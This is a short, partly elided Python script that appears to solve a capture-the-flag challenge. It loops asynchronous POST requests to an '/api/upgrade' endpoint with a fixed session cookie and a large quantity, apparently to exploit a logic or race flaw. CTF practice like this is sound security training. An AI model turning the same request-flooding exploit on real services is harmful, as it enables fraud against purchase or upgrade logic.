...
TARGET = "http://8b6ab80f-0a49-49da-b35f-076f9f9396a4.challenges.htu.edu.jo"
id = "G3%2F3phFLO0WWj2d6ktgzZGvsTfblvim5ipJG4bNIRIpbezMDtiCQrDF6LgQtTaU1sxK%2FLg%3D%3D"
    ...
    while True:
        async with httpx.AsyncClient() as client:
            ...
            r = await client.post(
                f"{TARGET}/api/upgrade",
                cookies={"id": id},
                data={"name": "Donate to charity", "quantity": 5000},
            )
            print(r.text)
            await asyncio.sleep(0.5)
            print(await check(client))
